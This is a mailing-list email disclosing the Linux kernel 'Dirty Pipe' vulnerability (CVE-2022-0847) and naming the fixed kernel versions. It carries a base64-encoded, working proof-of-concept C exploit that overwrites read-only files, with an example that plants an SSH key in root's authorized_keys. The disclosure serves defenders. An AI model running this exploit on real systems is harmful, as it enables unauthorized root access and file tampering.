X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6947" "Monday" "7" "March" "2022" "13:01:19" "+0100" "Max Kellermann" "max.kellermann@ionos.com" nil "130" "[oss-security] CVE-2022-0847: Linux kernel: overwriting read-only files" nil nil nil "3" nil nil (number mark "U       max.kellerma Mar  7  130/6947  " thread-indent "\"[oss-security] CVE-2022-0847: Linux kernel: overwriting read-only files\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2022-0847: Linux kernel: overwriting read-only files" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1432 invoked by uid 550); 7 Mar 2022 12:08:08 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31825 invoked from network); 7 Mar 2022 12:01:42 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=ionos.com; s=google;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=i4r/BU3Kz4FoqfIkWt9M8zriciSHNpF5GadtXGLXp5k=;
        b=gQ2fYPe3+Vyp5kW3qEdC002xLNhk422syG0H1VjUCk4hb3MQ/ZOyajPwYd9m8IbfQq
         midrLmkHbUXDnrB4iDkPIB1ZlCk0r1WQzTe1Td5/Gn/GlvujohezT4YTpxFtzZlX0ID4
         0bBL1JH0gvuuYne1NoKRddN72eDeMyCRwndMv4KEOAONp6h8s4ArSPnq3Ct9z3pqa/BH
         N6jr0x4WHo4z7gg2peaBFRW64n62GK0hpiKprieiHR5rhcnzEn3EFlzQDFICx6lEBncN
         qmUbodrGbPWVNkr4hN9jwJVTb6QvW8LADCVyXwAgRrYkjY47t29vk35NTK7D/18n2Sf7
         IO2Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=i4r/BU3Kz4FoqfIkWt9M8zriciSHNpF5GadtXGLXp5k=;
        b=3WviqWzJrZwErEfAWtITsmOf7vEwzBziWMsk709JIS5LLavpSw4B5L35GhdnjcMLmF
         bQ6C8UYThJdj7vRFtdHg276tTAtabwwsz8f7GGwBJsDaDeOW7/rmGYNo+SwLSBBw0Tvb
         Pzl37FkqsowULW4r5zz9jsAykUPFArOLZ1Jaz5zy0wo3E05075rF1t+8t9zvjjpgRsZq
         l78RdKJMCr1HN+nqZAbb6+J501IP+czsLrWSS3a1JN6Kb9PSgx0X3ygmZfKILGG4o26E
         7tXwK7TZ5wixIDJl7NlRfxcZf/kNkBRcIkJLP9cKfTMZ1g5lVM+2in4B11hYL5wmXwB7
         dMMg==
X-Gm-Message-State: AOAM531/TgWm2A1gx7M7wye/dDmZBcNRxtuRyhO1kAqAhoHZueBtrnUh
	WdGhs4H6FczNHHF9rqXdTuN8n9kk4p2AHSNrwA2XJdPy0WyHKw==
X-Google-Smtp-Source: ABdhPJxmAc/kTIK8kuLwISB0VW3FTQ7GEywzNXLcPoJxcD+mpKBhq1v34ZuQA9guueo357bAy+VGRwoXyny8KFBKiKY=
X-Received: by 2002:a50:ce10:0:b0:416:420d:b338 with SMTP id
 y16-20020a50ce10000000b00416420db338mr5232849edi.291.1646654490558; Mon, 07
 Mar 2022 04:01:30 -0800 (PST)
MIME-Version: 1.0
From: Max Kellermann <max.kellermann@ionos.com>
Date: Mon, 7 Mar 2022 13:01:19 +0100
Message-ID: <CAKPOu+8WtknWoUeY-CTK5ejo0hOQDsPOsbO12pFK6ifJwmVo4Q@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="000000000000fa7b9605d99f9f11"
Subject: [oss-security] CVE-2022-0847: Linux kernel: overwriting read-only files

--000000000000fa7b9605d99f9f11
Content-Type: text/plain; charset="UTF-8"

Hi oss-security,

two weeks ago, I found a vulnerability in the Linux kernel since
version 5.8 commit f6dd975583bd ("pipe: merge anon_pipe_buf*_ops") due
to uninitialized variables.  It enables anybody to write arbitrary
data to arbitrary files, even if the file is O_RDONLY, immutable or on
a MS_RDONLY filesystem.  It can be used to inject code into arbitrary
processes.

It is similar to CVE-2016-5195 "Dirty Cow", but is easier to exploit.

The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.

A proof-of-concept exploit is attached.

For anybody curious, here's an article about how I discovered this:
 https://dirtypipe.cm4all.com/

Max

--000000000000fa7b9605d99f9f11
Content-Type: text/x-csrc; charset="US-ASCII"; name="write_anything.c"
Content-Disposition: attachment; filename="write_anything.c"
Content-Transfer-Encoding: base64
Content-ID: <f_l0gmluoh0>
X-Attachment-Id: f_l0gmluoh0

LyogU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IEdQTC0yLjAgKi8KLyoKICog
Q29weXJpZ2h0IDIwMjIgQ000YWxsIEdtYkggLyBJT05PUyBTRQogKgogKiBh
dXRob3I6IE1heCBLZWxsZXJtYW5uIDxtYXgua2VsbGVybWFubkBpb25vcy5j
b20+CiAqCiAqIFByb29mLW9mLWNvbmNlcHQgZXhwbG9pdCBmb3IgdGhlIERp
cnR5IFBpcGUKICogdnVsbmVyYWJpbGl0eSAoQ1ZFLTIwMjItMDg0NykgY2F1
c2VkIGJ5IGFuIHVuaW5pdGlhbGl6ZWQKICogInBpcGVfYnVmZmVyLmZsYWdz
IiB2YXJpYWJsZS4gIEl0IGRlbW9uc3RyYXRlcyBob3cgdG8gb3ZlcndyaXRl
IGFueQogKiBmaWxlIGNvbnRlbnRzIGluIHRoZSBwYWdlIGNhY2hlLCBldmVu
IGlmIHRoZSBmaWxlIGlzIG5vdCBwZXJtaXR0ZWQKICogdG8gYmUgd3JpdHRl
biwgaW1tdXRhYmxlIG9yIG9uIGEgcmVhZC1vbmx5IG1vdW50LgogKgogKiBU
aGlzIGV4cGxvaXQgcmVxdWlyZXMgTGludXggNS44IG9yIGxhdGVyOyB0aGUg
Y29kZSBwYXRoIHdhcyBtYWRlCiAqIHJlYWNoYWJsZSBieSBjb21taXQgZjZk
ZDk3NTU4M2JkICgicGlwZTogbWVyZ2UKICogYW5vbl9waXBlX2J1Zipfb3Bz
IikuICBUaGUgY29tbWl0IGRpZCBub3QgaW50cm9kdWNlIHRoZSBidWcsIGl0
IHdhcwogKiB0aGVyZSBiZWZvcmUsIGl0IGp1c3QgcHJvdmlkZWQgYW4gZWFz
eSB3YXkgdG8gZXhwbG9pdCBpdC4KICoKICogVGhlcmUgYXJlIHR3byBtYWpv
ciBsaW1pdGF0aW9ucyBvZiB0aGlzIGV4cGxvaXQ6IHRoZSBvZmZzZXQgY2Fu
bm90CiAqIGJlIG9uIGEgcGFnZSBib3VuZGFyeSAoaXQgbmVlZHMgdG8gd3Jp
dGUgb25lIGJ5dGUgYmVmb3JlIHRoZSBvZmZzZXQKICogdG8gYWRkIGEgcmVm
ZXJlbmNlIHRvIHRoaXMgcGFnZSB0byB0aGUgcGlwZSksIGFuZCB0aGUgd3Jp
dGUgY2Fubm90CiAqIGNyb3NzIGEgcGFnZSBib3VuZGFyeS4KICoKICogRXhh
bXBsZTogLi93cml0ZV9hbnl0aGluZyAvcm9vdC8uc3NoL2F1dGhvcml6ZWRf
a2V5cyAxICQnXG5zc2gtZWQyNTUxOSBBQUEuLi4uLi5cbicKICoKICogRnVy
dGhlciBleHBsYW5hdGlvbjogaHR0cHM6Ly9kaXJ0eXBpcGUuY200YWxsLmNv
bS8KICovCgojZGVmaW5lIF9HTlVfU09VUkNFCiNpbmNsdWRlIDx1bmlzdGQu
aD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzdGRpby5oPgojaW5j
bHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUg
PHN5cy9zdGF0Lmg+CiNpbmNsdWRlIDxzeXMvdXNlci5oPgoKI2lmbmRlZiBQ
QUdFX1NJWkUKI2RlZmluZSBQQUdFX1NJWkUgNDA5NgojZW5kaWYKCi8qKgog
KiBDcmVhdGUgYSBwaXBlIHdoZXJlIGFsbCAiYnVmcyIgb24gdGhlIHBpcGVf
aW5vZGVfaW5mbyByaW5nIGhhdmUgdGhlCiAqIFBJUEVfQlVGX0ZMQUdfQ0FO
X01FUkdFIGZsYWcgc2V0LgogKi8Kc3RhdGljIHZvaWQgcHJlcGFyZV9waXBl
KGludCBwWzJdKQp7CglpZiAocGlwZShwKSkgYWJvcnQoKTsKCgljb25zdCB1
bnNpZ25lZCBwaXBlX3NpemUgPSBmY250bChwWzFdLCBGX0dFVFBJUEVfU1op
OwoJc3RhdGljIGNoYXIgYnVmZmVyWzQwOTZdOwoKCS8qIGZpbGwgdGhlIHBp
cGUgY29tcGxldGVseTsgZWFjaCBwaXBlX2J1ZmZlciB3aWxsIG5vdyBoYXZl
CgkgICB0aGUgUElQRV9CVUZfRkxBR19DQU5fTUVSR0UgZmxhZyAqLwoJZm9y
ICh1bnNpZ25lZCByID0gcGlwZV9zaXplOyByID4gMDspIHsKCQl1bnNpZ25l
ZCBuID0gciA+IHNpemVvZihidWZmZXIpID8gc2l6ZW9mKGJ1ZmZlcikgOiBy
OwoJCXdyaXRlKHBbMV0sIGJ1ZmZlciwgbik7CgkJciAtPSBuOwoJfQoKCS8q
IGRyYWluIHRoZSBwaXBlLCBmcmVlaW5nIGFsbCBwaXBlX2J1ZmZlciBpbnN0
YW5jZXMgKGJ1dAoJICAgbGVhdmluZyB0aGUgZmxhZ3MgaW5pdGlhbGl6ZWQp
ICovCglmb3IgKHVuc2lnbmVkIHIgPSBwaXBlX3NpemU7IHIgPiAwOykgewoJ
CXVuc2lnbmVkIG4gPSByID4gc2l6ZW9mKGJ1ZmZlcikgPyBzaXplb2YoYnVm
ZmVyKSA6IHI7CgkJcmVhZChwWzBdLCBidWZmZXIsIG4pOwoJCXIgLT0gbjsK
CX0KCgkvKiB0aGUgcGlwZSBpcyBub3cgZW1wdHksIGFuZCBpZiBzb21lYm9k
eSBhZGRzIGEgbmV3CgkgICBwaXBlX2J1ZmZlciB3aXRob3V0IGluaXRpYWxp
emluZyBpdHMgImZsYWdzIiwgdGhlIGJ1ZmZlcgoJICAgd2lsbCBiZSBtZXJn
ZWFibGUgKi8KfQoKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQp7
CglpZiAoYXJnYyAhPSA0KSB7CgkJZnByaW50ZihzdGRlcnIsICJVc2FnZTog
JXMgVEFSR0VURklMRSBPRkZTRVQgREFUQVxuIiwgYXJndlswXSk7CgkJcmV0
dXJuIEVYSVRfRkFJTFVSRTsKCX0KCgkvKiBkdW1iIGNvbW1hbmQtbGluZSBh
cmd1bWVudCBwYXJzZXIgKi8KCWNvbnN0IGNoYXIgKmNvbnN0IHBhdGggPSBh
cmd2WzFdOwoJbG9mZl90IG9mZnNldCA9IHN0cnRvdWwoYXJndlsyXSwgTlVM
TCwgMCk7Cgljb25zdCBjaGFyICpjb25zdCBkYXRhID0gYXJndlszXTsKCWNv
bnN0IHNpemVfdCBkYXRhX3NpemUgPSBzdHJsZW4oZGF0YSk7CgoJaWYgKG9m
ZnNldCAlIFBBR0VfU0laRSA9PSAwKSB7CgkJZnByaW50ZihzdGRlcnIsICJT
b3JyeSwgY2Fubm90IHN0YXJ0IHdyaXRpbmcgYXQgYSBwYWdlIGJvdW5kYXJ5
XG4iKTsKCQlyZXR1cm4gRVhJVF9GQUlMVVJFOwoJfQoKCWNvbnN0IGxvZmZf
dCBuZXh0X3BhZ2UgPSAob2Zmc2V0IHwgKFBBR0VfU0laRSAtIDEpKSArIDE7
Cgljb25zdCBsb2ZmX3QgZW5kX29mZnNldCA9IG9mZnNldCArIChsb2ZmX3Qp
ZGF0YV9zaXplOwoJaWYgKGVuZF9vZmZzZXQgPiBuZXh0X3BhZ2UpIHsKCQlm
cHJpbnRmKHN0ZGVyciwgIlNvcnJ5LCBjYW5ub3Qgd3JpdGUgYWNyb3NzIGEg
cGFnZSBib3VuZGFyeVxuIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0K
CgkvKiBvcGVuIHRoZSBpbnB1dCBmaWxlIGFuZCB2YWxpZGF0ZSB0aGUgc3Bl
Y2lmaWVkIG9mZnNldCAqLwoJY29uc3QgaW50IGZkID0gb3BlbihwYXRoLCBP
X1JET05MWSk7IC8vIHllcywgcmVhZC1vbmx5ISA6LSkKCWlmIChmZCA8IDAp
IHsKCQlwZXJyb3IoIm9wZW4gZmFpbGVkIik7CgkJcmV0dXJuIEVYSVRfRkFJ
TFVSRTsKCX0KCglzdHJ1Y3Qgc3RhdCBzdDsKCWlmIChmc3RhdChmZCwgJnN0
KSkgewoJCXBlcnJvcigic3RhdCBmYWlsZWQiKTsKCQlyZXR1cm4gRVhJVF9G
QUlMVVJFOwoJfQoKCWlmIChvZmZzZXQgPiBzdC5zdF9zaXplKSB7CgkJZnBy
aW50ZihzdGRlcnIsICJPZmZzZXQgaXMgbm90IGluc2lkZSB0aGUgZmlsZVxu
Iik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCglpZiAoZW5kX29mZnNl
dCA+IHN0LnN0X3NpemUpIHsKCQlmcHJpbnRmKHN0ZGVyciwgIlNvcnJ5LCBj
YW5ub3QgZW5sYXJnZSB0aGUgZmlsZVxuIik7CgkJcmV0dXJuIEVYSVRfRkFJ
TFVSRTsKCX0KCgkvKiBjcmVhdGUgdGhlIHBpcGUgd2l0aCBhbGwgZmxhZ3Mg
aW5pdGlhbGl6ZWQgd2l0aAoJICAgUElQRV9CVUZfRkxBR19DQU5fTUVSR0Ug
Ki8KCWludCBwWzJdOwoJcHJlcGFyZV9waXBlKHApOwoKCS8qIHNwbGljZSBv
bmUgYnl0ZSBmcm9tIGJlZm9yZSB0aGUgc3BlY2lmaWVkIG9mZnNldCBpbnRv
IHRoZQoJICAgcGlwZTsgdGhpcyB3aWxsIGFkZCBhIHJlZmVyZW5jZSB0byB0
aGUgcGFnZSBjYWNoZSwgYnV0CgkgICBzaW5jZSBjb3B5X3BhZ2VfdG9faXRl
cl9waXBlKCkgZG9lcyBub3QgaW5pdGlhbGl6ZSB0aGUKCSAgICJmbGFncyIs
IFBJUEVfQlVGX0ZMQUdfQ0FOX01FUkdFIGlzIHN0aWxsIHNldCAqLwoJLS1v
ZmZzZXQ7Cglzc2l6ZV90IG5ieXRlcyA9IHNwbGljZShmZCwgJm9mZnNldCwg
cFsxXSwgTlVMTCwgMSwgMCk7CglpZiAobmJ5dGVzIDwgMCkgewoJCXBlcnJv
cigic3BsaWNlIGZhaWxlZCIpOwoJCXJldHVybiBFWElUX0ZBSUxVUkU7Cgl9
CglpZiAobmJ5dGVzID09IDApIHsKCQlmcHJpbnRmKHN0ZGVyciwgInNob3J0
IHNwbGljZVxuIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCgkvKiB0
aGUgZm9sbG93aW5nIHdyaXRlIHdpbGwgbm90IGNyZWF0ZSBhIG5ldyBwaXBl
X2J1ZmZlciwgYnV0CgkgICB3aWxsIGluc3RlYWQgd3JpdGUgaW50byB0aGUg
cGFnZSBjYWNoZSwgYmVjYXVzZSBvZiB0aGUKCSAgIFBJUEVfQlVGX0ZMQUdf
Q0FOX01FUkdFIGZsYWcgKi8KCW5ieXRlcyA9IHdyaXRlKHBbMV0sIGRhdGEs
IGRhdGFfc2l6ZSk7CglpZiAobmJ5dGVzIDwgMCkgewoJCXBlcnJvcigid3Jp
dGUgZmFpbGVkIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCWlmICgo
c2l6ZV90KW5ieXRlcyA8IGRhdGFfc2l6ZSkgewoJCWZwcmludGYoc3RkZXJy
LCAic2hvcnQgd3JpdGVcbiIpOwoJCXJldHVybiBFWElUX0ZBSUxVUkU7Cgl9
CgoJcHJpbnRmKCJJdCB3b3JrZWQhXG4iKTsKCXJldHVybiBFWElUX1NVQ0NF
U1M7Cn0K

--000000000000fa7b9605d99f9f11--
